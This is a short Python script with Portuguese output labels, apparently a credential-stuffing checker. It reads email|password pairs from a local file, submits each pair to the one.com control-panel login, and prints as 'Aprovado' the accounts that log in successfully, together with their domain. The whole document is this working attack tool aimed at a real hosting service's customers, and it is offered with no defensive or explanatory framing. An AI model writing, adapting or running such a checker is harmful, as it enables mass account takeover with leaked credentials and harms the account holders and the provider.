# -*- coding:utf-8 -*-

## Imports
import requests, re
import ascii

arq = open('./db.txt', 'r')
arq2 = arq.readlines()
for item in arq2:
    try:
        email = item.split('|', 1)[0]
        senha = item.split('|', 1)[1]
        senha2 = senha.replace('\n', '')
        a = requests.post('https://www.one.com/admin/login.do?loginDomain=true&displayUsername={}&username={}&targetDomain=&password1={}&loginTarget='.format(ascii.ascii(email), ascii.ascii(email), ascii.ascii(senha2)))
        b = a.text
        c = re.search('<title>Control Panel Login</title>', b)
        if c == None:
            domain = re.search('<h3 id="adminCurrentDomain">[\w\d.*]+', b)
            domain = domain.group().split('>', 1)[1]
            print("Aprovado >> Email: {} | Senha: {} | Dominio: {}".format(email, senha2, domain))
        else:
            print("Reprovado >> {} | {}".format(email, senha2))
    except:
        print("\nAcabou de Testar!")
        break

